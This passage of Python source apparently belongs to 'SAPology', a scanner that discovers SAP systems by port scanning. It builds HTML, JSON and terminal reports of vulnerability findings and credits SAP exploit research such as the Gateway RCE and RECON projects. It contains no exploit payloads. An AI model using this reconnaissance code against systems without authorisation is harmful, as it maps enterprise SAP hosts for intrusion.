cwa9uGy4+I29tI2/GIyhUYydmIwxxozNOH1nuI+hBYYBWYdceJAJuQkD+ZD9OJG3zYYZ+Vpy+JG5pYcleZLRmI7xRo63BI41uSQwmV4s2Sjt+I7xmF/0uJSn+JNhspM/ZZMJVJX/BJW1MpRFeZT3xZRNuZJh+clc+apYuYV2uW5yOTRleYxpmZRt+ZavgkX/FHmZMfKQnbkiCxkun3maB5aZrXkKGzmbHRmSublHJvmbwRkkQeMogtlyf/l7IfGcKbecqXaYIbOYofiY5XmKl4Kdl1id8Tmf89mew9ed3xmey3ie53mcL4OfLVmfETqhi9Kgl9ifpxGg41mgBzqZueaaLVqGqTmjNXqjObosL/qjzVObRfqGu7mkdyScUTqlxfkqyIShDVqhYbqTXZqfHToRITqiJTqnCdpQZrqnWzOmgbrJfLqna9qmbzqgczqp6Tlfhrqp6TSoEdqppbomitqojzqPlTqrQSM9QbqrvTpaOjqsyfOrybqsqWWk0ZqkTXqtcUSl3fqtRZKlaWiq/+kai4+rrvH6KKv6oa8aqbP6r5d66fJ6sAm7sGd6r4mvr3EasAF7pxHRsCE7siU7lhE7sRXbrxmbsbc6rV3ErD37s0E7tEV7hjm7tBOWrVG7reF6tVk7rq2iVic7tmV7to+jsqXqsm0ms3WbKR3bamn7t4Fbtm37tnF7sXf7uHvbjoN7uZn7sId7uYrbuI97ujfbtJ1ptLE7u7V7uwnWur1bPVM7vFW7tcm7vF27CZ77HZp7vdm7jtN76aI7t6d7viczudO7vfE7v+3lvWswvuWbvgHcJudhHuybv4dCvxE8wXfCwOPQv/87wAN8wCW8ur9bm7n7wjE8w2W4wjncmf/E+8PH27xF3LzRocRNHB0KnMELWsFZHK9V3B8dfHMhHMIlvMYHPMVfXDlafMfLOcdlMsZlfMYB3MaJnMDR+7V9vGJ4fMlBOcmREsiDXMjpu8iJ3CrmoR6sosO1/Fo0vMu9fJm3PMyvEMTJPEdG/MxJ/MTVfM2tAh2wHL2dPA6ZfM6JI85rFcrNV8ppnMr53Mrr4R2Q3M79kc6XXNDHF8/zXM+HnM8Z3cqv/M0NHXMJPbYjPZQRPXMUfcYZfdON/NHrARqyXMxFPZu/vNRJe9RRvZHLfNXNHM1dnbzXPNZl3cTb3M3r4db/pgniodKfe9L5kdeH+9LNNNMjnNM53dHcbz3Z31zXnwLYc9zXv8TZX1zYh53YF93Yj93PlR3Xr2IqpF3a8/vbnZ3aq93a5xvb0f0q6IEetj3ZubAJuCXV5X3ed9Gi6f3e8T0vWX3fW/3V/Z21Zz3gBf4q1KHg233bc73bPUPcGb7hHT7Yyd00zb3Y0T3b1Z3dD77dbwY0OL7jPf7jQT7kRX7kSb7kTf7kUT7lVX7lWb7lXf7lYT7mZX7mab7mbf7mcT7ndX7neb7nfZ7j1x3jM/7gP+Pnjf7okT7plX7pmb7pnf7poT7qpX7qqZ7kg17o2z0gAAAh+QQBMgD3ACwRABAAowKwAIcA/0EA/UEA+0AA+UAB9T8B7z0B6TwB5zsB5DsC3zkC2TgC0jcAzTMDzDUAzDMByTMBxzIBxTICwTECvzECvDADtS8Dri0ArAIAqgAEqCwEpSsEnyoFkycFjiYFiyUFhyQGgiQGfiMGeSEHdSEHcBsEayAHZx4AaCIAZiICZCAHYBwBYSEBXiAAYiEHWxwBXR8GWRwAWQIJVxoCVx4AVQAWThoJURgaShoFUhsETxsETBoZRRgPRRcFRRMARwIARAAXQhgXQBcMQRUXPRYWOxYPPBQGQhMGPAsBQgIAQwABQAECPgICPQICPAMaOhoLOhEVNxUUMxMMMhEHOBMHNBADOAMAOAIDNgMDNAQEMwQFMQQAMgATLxIMLxEPLBEJLg8KKwwFLwYGLQYBLwECLQIGLAYDKwMPKhAKKhAKKgoHKggRKBAMJw8LJw4MJQ4LJQ4QJA8MJA4LJA4QIw8MIw4MIw0LIw0OIg4MIg4MIg0LIg4LIgoJJwsGKAUGJwYFJgUIJQkIJQYGJQUKIwwHIgYOIA4MIQ4MIQ0MIA4MIA0LIQ4LIA0JIQoHIAcPHw0NHw0NHwwNHg0NHgwMHw0MHg0MHgwPHQ0NHQ0NHQwMHQ0MHQwOHA0NHA0NHAwMHA0MHAwLHw0LHg4LHg0LHQ4LHQ0LHQsKHgsJHgcJHQgLHA0LHAwLHAsJHAgOGwwNGw0NGwwNGwsOGgwNGgwNGgsMGw0MGwwMGwsMGgwMGgsLGw0LGwwLGwsLGgwKGwoJGwgOGQwNGQwNGQsNGAwNGAsMGQwMGQsMGAwMGAsLGQwLGQsLGQoLGAwLGAsLGAoNFwsMFwwMFwsLFwsLFwkKGQkKFwsKFwoKFwkJFwkNFgsMFgwMFgsMFgoNFQsMFQsMFQoMFAsMFAoLFgoKFgsKFgoKFgkLFQoKFQoKFQkLFAoKFAoKFAkJFAoMEwoLEwsLEwoLEgoLEQoKEQkKEAkKDwkKDgkJDgkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAI/wDvCRxIsKDBgwgHAknIsKHDhxAjSpy4UCKRiRgzatzIsaPHjyBDihxJsqTJkyhTqkQ4ZKXLlwNbwpxJs6bNmzhz6tzJs+fAHQVl+hzKUCjRo0iTKl3KtCnSHUBFRo3p9KjRqlizat3KtWtPIlcTLgR6keK9hUEIXpx6tm3aovfY3rt4g+DYuWrjPlxLMC0QImVNLkQ7kO7BwBOhRg1seGAQIhW9Sp5MubLljogbBokq0yhiuUMqvhVYNnJogaNZMoy8WaBngZETlnY9sC7twiBP30sNOyRQmbbtFg5+m/Tl48iTK28am2HqqBWbg3b4NqxsiM8P8na+undul0abF//M7F388vPo06s/SWR7QfdR5U5vyFniEN6t8e52KJdhf4LxOUSefgRZl9+AAhoUnmOLGWdQgOtFKOGEFIIUW3CAPVhQbNZFV+BD5u3XVm0HhVhiUIhlGBKHBvGGIHUAaocaQipWaOONOKr3n2MVGXUDcaodNmNxEZm3Q1n5vSbiTwYhWRyQP4pk3U8vMunQggUd6aBBUebo5ZdgbrXDDVXuB4RcQRj5IUJQrQlRmwCSqZ9f/cGZ5YNsEXFDWGlKedCYF81m5aAJYRmXnGUh2GeYjDbqaFbuEZhUpCZNqZ6lj2aq6aY0mciUp5yGKuqopO60XX5LUdrRDrGhOqGrpcb/KuustNZq66245qrrrrz26uuvwAYr7LDEFmvsscgmq+yyzDbr7LPQRivttNRWa+212Gar7bbcduvtt+CGK+645JZr7rnopqvuuuy26+678MYr77z01mvvvfjmq+++/Pbr778AByzwwAQXbPDBCCes8MIMN+zwwxBHLPHEFFds8cUYZ6zxxhx37PHHIIcs8sgkl2zyySinrPLKLLfs8sswxyzzzDTXbPPNOOes88489+zzz0vVIvTQRA8NtM0TfNvN0kw3zfTRYE6QQAH3EGCAQByokGzS3jrt9dJQ3zgCRArcIwRIJUB0AEMDFJAABBqIcDZlXHf7tddhX4bETiYk/2SB2hMhQLeze0dU9OFC5z1hAilpkNDVD62NkQEueFU3t3c7rXiEC6jEeEJzNyT5hJdvm3nTm6s3dk4hRL7RAKFPFju1pz+delZHTAQ5SiI0VDpCo+fIw0GV+1o4RIgffvt5OiBEQd8FiaDB5yIR4DpHw1M2+7S1g728hK03BELnEFFN0N8YBc+Q+shtL2333XyvnOMFlS1S8wZZTxAHDrGf0AMHAaD2sAU/+TkldxxB30kGcBDyrS8i7jNfTUhQgQUYoG0CAYH7HJK9ghSPIxS0IAbvocGN/K0AA0CAAqtyvIe84hXJM5oB0yPAkEAAJP5jygYaEoENgo4kO2RID/8l0sGE0G8lFXAJN5a4xLvNUD3QAwkD94eQKAJPIhTQiQsk2BD+QVAkW4SIFx1ixYMw7ogJYR/1JPLBlDDxjdzQ3BMtAwKEoHEkWjvIHQ2SQ4T8biZpM4kPMRLIkUyRITXESBEN4sCB9JEkcISj7eaIFARCBH8JWd1GgtjAggjugU5pY0Q42ZBFCkSUJyHlQXbXEP1hRJUEcd8YM9JCh7zwlrjEJSUt08iDuPIj1IOl6DrCxZSwkiSDlMgxPzLLj/xumT2JpDR3OSEFaPIjZbxH79IYkRsaJJEo2eM9GDi3EXzSkw9JJkTESU6BmPMg5zTIIQligGtKJJv3QKVA7Ef/EHC6UZpwpCaFEIBPhNjzHgeNyCMJEs+azFMgBLABIw9S0Fh+5KFVOwg/CVJIgiR0mVmMyDJXOBBTIhQmAA2oQIdiSYmI4JcgIanZCLLGexSzIAtVyjYLIgSMNoCDxPPITmPp04NEICI3TUgzM2qQpcKUlhLJpVRfuNIKbfRxBUmqQjnyx5L8tCA1JYg4HaJOh3yVpkaEyFPPOpKOCqShNUnpG6t6maN+pAcGCelAEspNjcDuJkvtSFkxEliG5HEg7qvjQQabkK7mRK5MpOtlhLCBp05EsQzZnj8dmZynFhaxNPFsQSqKEGhW0SGwDKtKILtEyfKkpR0ZAVvz5xGt/x4kp6uECQkw0st7yLQgJtUnQnY7kd6SdKgPsWv5DILZe+AWqhGZqlRdmxy8JqS5BbEsR547ELiqBLkP0etAxLvYjoDXIeS9h2MHgtGNLHW2O8GGfOVKXeW4wLLeFIkwnduQAnwyBIxNiXYH8tuGBFitDZEpfA1iW4y4b257XO9J5EthgNZXOTDwJUI+uxHu+mTAAilwZkkC4nskESPt3YhyGWwQ0k6YwvON5IVxAluRrLghvfWIh20SPon8TsLuE+5BehwRCZNwIvmFCHHRepAGT6SWDZFuLmccoQM/JKE7romLO1kQEaONtwYhKV+xOhEnD2S/KoGxmudK5eNgV/8g29tygm/b2aZmRM4bEa1D3gznjMBSAzc16UrUTOjWtvkyaC7IWEVK561wuCePNshhGbLgjZQ1xy4hdKEPTZMaM2SHExB0QUxrELgKeZwGMWWWM0KCC7j61ReQSG9VK5BF99cglUbIrNM6kqRe9SC5HgifNwJlhkhZl5xOSqIfgmmPvJl9ttZIDErC1xQ7ZLMeSWhPcb3VgqQ3IktGiLUHrWk1J1vZo7bACDApBBHQGpbgbTbWDPI7aJNk2h3BaEQn2uKHCLPEBdG3Rg/i1j6vcnWnXi5Sym3ucx9l2SCBOG1xapBoZwTfJGknQr3rXY8EO+Az3Tg8cZLohKeE4TD/drhLPJ0QiZfZIAXPyKox0mpYu3pyGjH5QGgN7NKSpAgA74ioZ86QYifk2LdUOVFc7svtSTQjv26mvUeCcZowPZ8RqbTODbLscCekAN/uSKRPjnL5Kn0oV/cgREgtVn5zVtH3BonXSzL2e+R67h8h8mk3MuaclN3sZ/cJB8wM1oQkWSJ4pzjcqS4Swt+j7gYZAdsF8nHHQ/4etLatvLP6TZ38HRuBRwnLxQeRjrOXuQ8pAkUJQnTE2/zmm+ShqCEyAgsoQKsfv8eyI4DJiKQtAQQgAOM0KVNsD7wgfSd2VJH+itAjpQQbeMDUqtZ6MJXAAha0qQImUMKeXD/7Bdh+//dHcuN7hN0g2wu689e/kptavNbsj79P8J7808vfUUYP2QYGaYOkzn4gv8NzHpF/99dmQZQAG0ACi7QB7SWAp4QQeleAEpgRl0cQ55V7jjeBGngQFbhPCJF7EbiBItgQaVc1G/RxuTeCKjhvEpEAohZspreCMsiC10NpCZGCM6iCPDAC/PNTB0A1VqMAWaRz8GUAz5ODSJiESriETNiETviEUBiFUjiFVFiFVniFWJiFWriFXNiFXviFYBiGYjiGZFiGZniGaJiGariGbNiGbviGcBiHcjiHdFiHdniHeJiHeriHfNiHfugtOrBD53c5HfV+5lcQEBCCXvF0IVGCf/9oLIEUAuT1ZlZURyaXRbN0Xo6CZ49YLBqwbCEwAZpURhRgcRRgAYmkiY3CiezXAshhXeuBAjqhAxygQGW0ASfGEFlkAUu2U/wTAZFWAQcljALRAxoQAV2lAyNAARQQc8YHETxwjKUzNiZAARGgStGIjP12ENnoWBpQSBFwTbXYiaXCYcRlRW5FARCXRVGUiAMBeRyAZkLwAIpVYNuEXCbwjAdxePNYjxZIEKTUjyE2WotFjwNZUvcQSCsmXg/AigxzAkcBi+jSeyixAeClAXtUiRChV9a1TeIVAaeWTb3HkfcgkY+HECpweBpBktY1NhvEkgNRUDB5kgmRPSnJMUb/wBAmmRE5WRAUKRE7qRE56YoH4Yo9KRA/KRBGkJRLmRBEWRBNaRA68JQNcZQDgUlB6RJWeRJCMALi5JFeFEUTYIh65UWaqIj01jq1F2LNlHgF4YgHYQFt6U4GsU1yWRBLhk93SRDERQE91kYKZIgRs5UDkQMCYZgJQZhKKRBUSZUM4ZiHGZmJ2RA5gJj3gElWeZSYZJk+iRA/mZVXCZUS0ZgEgT9JyZgRoZgMIYs3AYt25ZACEVLzKBCa+GhHdTZ/M0bkBQHIlZTAqI/hhYjbNALlF5vCGZMHsZs7xVcmoFygWTE/qZo3IZ08AZmoKZqPuZihiRLU2RHdWRLbVFgx/4deA1EBJOCO2jQRGxACI1ACSXQ5c0lGGqGS8Qlevoh8yMmB+Klew3YPEOACyygyEDkQEjmgJYkQz3mgEWGgBEoQBpqgBpEDJ0CRp3mZ93ACGDoQVgmLG2oQDKqdxYgQlRkRJlmgh8mZFeoQOoChHyqZJ5FN4xkBdQSbhygQfcObj2drICBmQSQCejeTDZoQxTkRM+mSztOgEDqTj7ZD9XcxTEkQOZCUUYqg92CdCNGdVjmlE0GYp9l7PakDvWddYEoQEDqmQaoReGWl9/CdWrEBGjA3HGBXhMkB7JgR4nVD2ySjwvZNscNu2jgQDxA+vwWhHRGoB0mX71gQhupb3/+UTYu6QmfTN4yIkCXDplt6mZzpEIQ6EknJmiGhph+RkzqQqekRAhZwY+CVRzSaXr44AREwVukVPhMwS8aok11kZDopTtSYRapUq0A5VsWjAdmkjiiDmCkaEaBqENZprCBRoZaKEc+KlBkBmcxKEEeZrKUpEWaKLqqIEiagkh+DlR7aAhTZogJhrue6qeeKECdArgWBrgwBkRSZkx+qAylwmUZgoAyqrw6qlCzKov06EB8qrwsalO1Kkfe6rQ4Br+y6Lk1aEv1JjgahrilxrPLysCFxVJrUOl72iNHqE1EpsSFjmiJbsiZ7siibsiq7sizbsi77sjAbszI7szRbszb/e7M4m7M6u7M827M++7NAG7RCO7RE6xVJYBJKsBFKkLQwsbQh4bQQcbQHwbQ8QYAgAbUvYbVveDzFprUS4bUDsQQOoQRiG7Y0AbYQUbYFQbYNUUtqaxBsKxBo+xBcK7crUUt1ixKFA2Vzm4ZSCxJ/axlvyyyDW7QIEbgegbgkQbUjwbgo4bgfAbkIIbmRix6Uu4dHW7gakbkqcbkZobkp4blb0bdVAbpxmLc90bekOxSra7dr67q+8rZ8m4dSa7oSUbuCmxSim7uG2xCKyxG/q7Q8YbsesbsJAbnGexKt+xDEe7UrG7ybGxHJa7YCgbVPyxDW2xHZS70g0bxYsb1PBTu9ExgQADs=" alt="SAPology Banner" style="max-width: 800px; width: 100%%; border-radius: 8px;">
</div>
<p style="color: var(--text-dim); margin-bottom: 20px;">Generated: %s | Duration: %s</p>

<h2>Executive Summary</h2>
<div class="summary">
  <div class="summary-card">
    <div class="number" style="color: var(--accent)">%d</div>
    <div class="label">SAP Systems</div>
  </div>
  <div class="summary-card">
    <div class="number" style="color: #ecf0f1">%d</div>
    <div class="label">Instances</div>
  </div>
  <div class="summary-card">
    <div class="number" style="color: %s">%d</div>
    <div class="label">Critical</div>
  </div>
  <div class="summary-card">
    <div class="number" style="color: %s">%d</div>
    <div class="label">High</div>
  </div>
  <div class="summary-card">
    <div class="number" style="color: %s">%d</div>
    <div class="label">Medium</div>
  </div>
  <div class="summary-card">
    <div class="number" style="color: %s">%d</div>
    <div class="label">Low / Info</div>
  </div>
</div>

<h2>Network Topology</h2>
<div class="topology">
%s
</div>

<h2>Vulnerability Findings (%d total)</h2>
<table>
  <thead>
    <tr><th>Severity</th><th>Finding</th><th>System</th><th>Description</th><th>Detail</th><th>Remediation</th></tr>
  </thead>
  <tbody>
  %s
  </tbody>
</table>

<h2>System Details</h2>
%s

%s

<div class="metadata">
  <h2 style="border:none; margin-top:0;">Scan Options</h2>
  <table class="scan-options-table">
    <thead>
      <tr><th>Option</th><th>Selected Value</th><th>Default</th><th>Description</th></tr>
    </thead>
    <tbody>
    %s
    </tbody>
  </table>
</div>

<div class="metadata" style="margin-top: 30px;">
  <h2 style="border:none; margin-top:0;">Credits &amp; Acknowledgments</h2>
  <table style="width:100%%; border-collapse:collapse; font-size:13px;">
    <thead>
      <tr style="border-bottom:1px solid var(--border);">
        <th style="text-align:left; padding:8px; color:var(--accent); width:30%%;">Project</th>
        <th style="text-align:left; padding:8px; color:var(--accent); width:25%%;">Author(s)</th>
        <th style="text-align:left; padding:8px; color:var(--accent);">Description</th>
      </tr>
    </thead>
    <tbody>
      <tr style="border-bottom:1px solid var(--border);">
        <td style="padding:8px;"><a href="https://github.com/OWASP/pysap" style="color:var(--accent);">pysap</a></td>
        <td style="padding:8px; color:var(--text-dim);">Martin Gallo (SecureAuth / OWASP)</td>
        <td style="padding:8px; color:var(--text-dim);">SAP protocol dissection library (NI, Diag, MS, RFC). Reference for DIAG login screen scraping and NI framing.</td>
      </tr>
      <tr style="border-bottom:1px solid var(--border);">
        <td style="padding:8px;"><a href="https://github.com/chipik/SAP_GW_RCE_exploit" style="color:var(--accent);">SAP Gateway RCE Exploit</a></td>
        <td style="padding:8px; color:var(--text-dim);">Dmitry Chastuhin (@_chipik)</td>
        <td style="padding:8px; color:var(--text-dim);">SAP Gateway RCE via misconfigured ACLs. Reference for SAPXPG packet construction and gateway vulnerability checks.</td>
      </tr>
      <tr style="border-bottom:1px solid var(--border);">
        <td style="padding:8px;"><a href="https://github.com/gelim/sap_ms" style="color:var(--accent);">SAP Message Server PoC</a></td>
        <td style="padding:8px; color:var(--text-dim);">Mathieu Geli &amp; Dmitry Chastuhin</td>
        <td style="padding:8px; color:var(--text-dim);">MS attack tools ("SAP Gateway to Heaven", OPCDE 2019). Reference for MS binary protocol and ACL checks.</td>
      </tr>
      <tr style="border-bottom:1px solid var(--border);">
        <td style="padding:8px;"><a href="https://github.com/gelim/nmap-sap" style="color:var(--accent);">SAP Nmap Probes</a></td>
        <td style="padding:8px; color:var(--text-dim);">Mathieu Geli &amp; Michael Medvedev (ERPScan)</td>
        <td style="padding:8px; color:var(--text-dim);">Custom Nmap service probes for SAP fingerprinting (DIAG, SAP Router, P4). Reference for port definitions, service identification, and protocol probes.</td>
      </tr>
      <tr style="border-bottom:1px solid var(--border);">
        <td style="padding:8px;"><a href="https://github.com/chipik/SAP_RECON" style="color:var(--accent);">SAP RECON (CVE-2020-6287)</a></td>
        <td style="padding:8px; color:var(--text-dim);">Dmitry Chastuhin (@_chipik), Pablo Artuso, Yvan &apos;iggy&apos; G</td>
        <td style="padding:8px; color:var(--text-dim);">PoC for CVE-2020-6287 (RECON) - SAP LM Configuration Wizard missing authorization check (CVSS 10.0). Reference for CTCWebService vulnerability detection.</td>
      </tr>
      <tr style="border-bottom:1px solid var(--border);">
        <td style="padding:8px;"><a href="https://onapsis.com/research" style="color:var(--accent);">Onapsis Research Labs</a></td>
        <td style="padding:8px; color:var(--text-dim);">Martin Doyhenard et al.</td>
        <td style="padding:8px; color:var(--text-dim);">ICMAD vulnerability research (CVE-2022-22536, CVSS 10.0). Reference for HTTP request smuggling detection via ICM memory pipe desynchronization.</td>
      </tr>
      <tr>
        <td style="padding:8px;"><a href="https://sec-consult.com" style="color:var(--accent);">SEC Consult Vulnerability Lab</a></td>
        <td style="padding:8px; color:var(--text-dim);">Fabian Hagg</td>
        <td style="padding:8px; color:var(--text-dim);">CVE-2022-41272 (CVSS 9.9) - Unauthenticated access to SAP NetWeaver P4 service. Reference for P4 protocol vulnerability detection.</td>
      </tr>
    </tbody>
  </table>
</div>

<div class="footer">
  SAPology by Joris van de Vis - For authorized security testing only
</div>

</body>
</html>""" % (
        scan_time, duration_str,
        len(landscape), total_instances,
        SEVERITY_COLORS[Severity.CRITICAL], critical_count,
        SEVERITY_COLORS[Severity.HIGH], high_count,
        SEVERITY_COLORS[Severity.MEDIUM], medium_count,
        SEVERITY_COLORS[Severity.LOW], low_count + info_count,
        svg_topology,
        total_findings,
        findings_rows if findings_rows else '<tr><td colspan="6" style="text-align:center; color: var(--text-dim)">No findings</td></tr>',
        system_details if system_details else '<p style="color: var(--text-dim)">No systems discovered</p>',
        url_scan_section,
        scan_options_rows,
    )

    # Inject BTP section if available
    if btp_results:
        try:
            from SAPology_btp import generate_btp_html_section
            btp_html = generate_btp_html_section(btp_results)
            if btp_html:
                html_content = html_content.replace("</body>", btp_html + "\n</body>")
        except ImportError:
            pass

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(html_content)


def generate_json_export(landscape, output_path, btp_results=None):
    """Export scan results as JSON."""
    data = {
        "scan_time": datetime.now().isoformat(),
        "systems": [s.to_dict() for s in landscape],
        "summary": {
            "total_systems": len(landscape),
            "total_instances": sum(len(s.instances) for s in landscape),
            "total_findings": sum(len(s.all_findings()) for s in landscape),
            "critical": sum(1 for s in landscape for f in s.all_findings() if f.severity == Severity.CRITICAL),
            "high": sum(1 for s in landscape for f in s.all_findings() if f.severity == Severity.HIGH),
            "medium": sum(1 for s in landscape for f in s.all_findings() if f.severity == Severity.MEDIUM),
            "low": sum(1 for s in landscape for f in s.all_findings() if f.severity == Severity.LOW),
            "info": sum(1 for s in landscape for f in s.all_findings() if f.severity == Severity.INFO),
        }
    }
    if btp_results:
        data["btp"] = btp_results.to_dict()
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, default=str)


def print_terminal_summary(landscape):
    """Print scan results to terminal using rich tables."""
    if HAS_RICH:
        console = Console()

        # Systems table
        sys_table = Table(title="SAP Systems Discovered", show_lines=True)
        sys_table.add_column("SID", style="cyan", width=10)
        sys_table.add_column("Hostname", style="white")
        sys_table.add_column("Kernel", style="dim")
        sys_table.add_column("Instances", style="green")
        sys_table.add_column("Open Ports", style="yellow")
        sys_table.add_column("Findings", style="red")

        for sys_obj in landscape:
            ports_all = set()
            for inst in sys_obj.instances:
                ports_all.update(inst.ports.keys())
            fc = len(sys_obj.all_findings())
            finding_str = str(fc)
            sev = sys_obj.highest_severity()
            if sev == Severity.CRITICAL:
                finding_str = "[bold red]%d CRITICAL[/bold red]" % fc
            elif sev == Severity.HIGH:
                finding_str = "[bold yellow]%d HIGH[/bold yellow]" % fc

            sys_table.add_row(
                sys_obj.sid,
                sys_obj.hostname or "N/A",
                sys_obj.kernel or "N/A",
                str(len(sys_obj.instances)),
                ", ".join(str(p) for p in sorted(ports_all)),
                finding_str,
            )

        console.print(sys_table)
        console.print()

        # Findings table
        if any(s.all_findings() for s in landscape):
            find_table = Table(title="Vulnerability Findings", show_lines=True)
            find_table.add_column("Severity", width=10)
            find_table.add_column("Finding", style="white")
            find_table.add_column("System", style="cyan")
            find_table.add_column("Port", style="yellow")
            find_table.add_column("Detail", style="dim", max_width=60)

            all_f = []
            for sys_obj in landscape:
                for inst in sys_obj.instances:
                    for f in inst.findings:
                        all_f.append((sys_obj, inst, f))
            all_f.sort(key=lambda x: x[2].severity)

            sev_styles = {
                Severity.CRITICAL: "bold red",
                Severity.HIGH: "bold yellow",
                Severity.MEDIUM: "yellow",
                Severity.LOW: "blue",
                Severity.INFO: "dim",
            }

            for sys_obj, inst, f in all_f:
                style = sev_styles.get(f.severity, "white")
                find_table.add_row(
                    "[%s]%s[/%s]" % (style, SEVERITY_NAMES[f.severity], style),
                    f.name,
                    "%s (%s)" % (sys_obj.sid, inst.ip),
                    str(f.port),
                    f.detail[:80],
                )

            console.print(find_table)
        else:
            console.print("[green]No vulnerability findings.[/green]")

        # URL scan results table
        has_urls = any(inst.url_scan_results for sys_obj in landscape for inst in sys_obj.instances)
        if has_urls:
            console.print()
            url_table = Table(title="ICM URL Scan Results", show_lines=True)
            url_table.add_column("System", style="cyan", width=8)
            url_table.add_column("Endpoint", style="white")
            url_table.add_column("Status", width=8)
            url_table.add_column("Path", style="yellow", max_width=50)
            url_table.add_column("Size", style="dim", width=8)
            url_table.add_column("Notes", style="dim", max_width=20)

            status_styles = {200: "green", 401: "yellow", 403: "red"}

            for sys_obj in landscape:
                for inst in sys_obj.instances:
                    for r in inst.url_scan_results:
                        sc = r["status_code"]
                        style = status_styles.get(sc, "white")
                        notes = ""
                        if r.get("verb_tamper"):
                            notes = "[bold yellow]VERB TAMPER[/bold yellow]"
                        if r.get("redirect"):
                            notes = r["redirect"][:30]
                        url_table.add_row(
                            sys_obj.sid,
                            "%s:%d" % (inst.ip, r.get("scan_port", 0)),
                            "[%s]%d[/%s]" % (style, sc, style),
                            r["path"],
                            str(r.get("content_length", 0)),
                            notes,
                        )

            console.print(url_table)
    else:
        # Fallback without rich
        print("\n" + "=" * 80)
        print("SAP Systems Discovered")
        print("=" * 80)
        for sys_obj in landscape:
            ports_all = set()
            for inst in sys_obj.instances:
                ports_all.update(inst.ports.keys())
            print("  SID: %-10s Host: %-20s Kernel: %-8s Ports: %s  Findings: %d" % (
                sys_obj.sid, sys_obj.hostname or "N/A", sys_obj.kernel or "N/A",
                ",".join(str(p) for p in sorted(ports_all)),
                len(sys_obj.all_findings()),
            ))

        findings_all = []
        for sys_obj in landscape:
            for inst in sys_obj.instances:
                for f in inst.findings:
                    findings_all.append((sys_obj, inst, f))
        if findings_all:
            print("\n" + "=" * 80)
            print("Vulnerability Findings")
            print("=" * 80)
            findings_all.sort(key=lambda x: x[2].severity)
            for sys_obj, inst, f in findings_all:
                print("  [%s] %s - %s (%s:%d)" % (
                    SEVERITY_NAMES[f.severity], f.name, sys_obj.sid, inst.ip, f.port))

        # URL scan results (fallback)
        has_urls = any(inst.url_scan_results for sys_obj in landscape for inst in sys_obj.instances)
        if has_urls:
            print("\n" + "=" * 80)
            print("ICM URL Scan Results")
            print("=" * 80)
            for sys_obj in landscape:
                for inst in sys_obj.instances:
                    for r in inst.url_scan_results:
                        notes = ""
                        if r.get("verb_tamper"):
                            notes = " [VERB TAMPER]"
                        print("  [%d] %s:%d %s%s" % (
                            r["status_code"], inst.ip, r.get("scan_port", 0),
                            r["path"], notes))


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 8: Orchestrator
# ═══════════════════════════════════════════════════════════════════════════════

VERBOSE = False

def log_verbose(msg):
    if VERBOSE:
        print("[*] %s" % msg)


def resolve_host(target):
    """Resolve a hostname to IP address."""
    try:
        return socket.gethostbyname(target)
    except socket.gaierror:
        return None


def expand_ip_range(range_str):
    """Expand an IP range like '192.168.1.1-192.168.1.50' or '192.168.1.1-50' into a list."""
    if "-" not in range_str:
        return [range_str]

    parts = range_str.split("-", 1)
    start_str = parts[0].strip()
    end_str = parts[1].strip()

    try:
        start_ip = ipaddress.IPv4Address(start_str)
    except (ipaddress.AddressValueError, ValueError):
        return [range_str]  # not an IP range

    # Support short form: 192.168.1.1-50 (only last octet)
    if "." not in end_str:
        try:
            last_octet = int(end_str)
            base = str(start_ip).rsplit(".", 1)[0]
            end_ip = ipaddress.IPv4Address("%s.%d" % (base, last_octet))
        except (ValueError, ipaddress.AddressValueError):
            return [range_str]
    else:
        try:
            end_ip = ipaddress.IPv4Address(end_str)
        except (ipaddress.AddressValueError, ValueError):
            return [range_str]

    if int(end_ip) < int(start_ip):
        return [range_str]

    result = []
    current = int(start_ip)
    while current <= int(end_ip):
        result.append(str(ipaddress.IPv4Address(current)))
        current += 1
    return result


def parse_single_target(t):
    """Parse a single target string into a list of IPs."""
    t = t.strip()
    if not t:
        return []

    # Check for IP range (contains '-' and looks like IPs, not CIDR)
    if "-" in t and "/" not in t:
        expanded = expand_ip_range(t)
        if len(expanded) > 1 or expanded[0] != t:
            return expanded

    # CIDR notation
    try:
        net = ipaddress.ip_network(t, strict=False)
        if net.prefixlen == 32:
            return [str(net.network_address)]
        return [str(addr) for addr in net.hosts()]
    except ValueError:
        pass

    # Hostname
    ip = resolve_host(t)
    if ip:
        return [ip]

    print("[-] Cannot resolve: %s" % t)
    return []


def parse_targets(target_str=None, target_file=None):
    """Parse target specification into list of IPs.

    Supports: single IP, hostname, CIDR (192.168.1.0/24),
    IP range (192.168.1.1-192.168.1.50 or 192.168.1.1-50),
    comma-separated combinations of the above.
    """
    targets = []

    if target_str:
        for t in target_str.split(","):
            targets.extend(parse_single_target(t))

    if target_file:
        try:
            with open(target_file) as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    targets.extend(parse_single_target(line))
        except FileNotFoundError:
            print("[-] Target file not found: %s" % target_file)

    return list(dict.fromkeys(targets))  # deduplicate preserving order


def parse_instance_range(range_str):
    """Parse instance range like '00-09' or '00,01,10'."""
    instances = []
    for part in range_str.split(","):
        part = part.strip()
        if "-" in part:
            start, end = part.split("-", 1)
            for i in range(int(start), int(end) + 1):
                instances.append(i)
        else:
            instances.append(int(part))
    return sorted(set(instances))


def discover_systems(targets, instances, timeout=3, threads=20, verbose=False,
                     cancel_check=None):
    """Phase 1: Discover SAP systems by port scanning and fingerprinting.
    cancel_check: callable returning True when scan should be aborted.
    """
    landscape = []

    has_progress = HAS_RICH

    # Two-phase scanning: quick pre-scan with dispatcher/gateway only,
    # then full scan only on hosts where SAP was detected.
    # Prescan always runs — even for single targets — to capture dispatcher
    # ports that the full parallel scan can miss due to connection floods.
    multi_target = len(targets) > 1

    # Phase 1: pre-scan across all hosts (dispatcher/gateway only)
    print("\n[*] Pre-scanning %d host(s) for SAP dispatcher/gateway ports ..." % len(targets))

    # Calculate total prescan ports for progress tracking
    prescan_port_list = build_port_list(instances, quick=True)
    prescan_unique = len(set(p[0] for p in prescan_port_list))
    total_prescan_probes = prescan_unique * len(targets)

    sap_targets = []
    prescan_results = {}  # {ip: dict of port -> {service, instance, description}}
    if has_progress:
        prog = Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
        )
        with prog:
